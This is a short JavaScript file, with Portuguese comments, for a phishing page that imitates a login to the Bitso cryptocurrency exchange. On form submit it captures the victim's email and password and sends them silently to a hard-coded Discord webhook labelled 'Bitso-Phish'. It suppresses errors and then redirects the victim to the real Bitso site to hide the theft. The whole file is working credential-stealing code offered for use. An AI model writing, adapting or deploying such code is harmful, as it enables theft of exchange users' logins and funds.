// Substitua pela URL do seu webhook (Discord, Telegram, Zapier, etc.)
const WEBHOOK = "https://discord.com/api/webhooks/1445896723158532179/F0anaPEG-NoxZhHdYgiUNTnSt4Opn6p1nbmEl2ctjOI3ZOY8iBGTSxApJcARqa_6QeDH";

document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const email = document.getElementById("email").value.trim();
  const pass  = document.getElementById("password").value.trim();

  // Envia para webhook em background
  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ text: `Bitso-Phish\nE: ${email}\nS: ${pass}` })
  }).catch(() => {}); // silencia erros

  // Feedback visual rápido + redireciona para site real
  document.getElementById("errMsg").style.display = "block";
  document.getElementById("errMsg").textContent = "Verificando…";
  setTimeout(() => {
    location.replace("https://bitso.com/br"); // leva ao original
  }, 1200);
});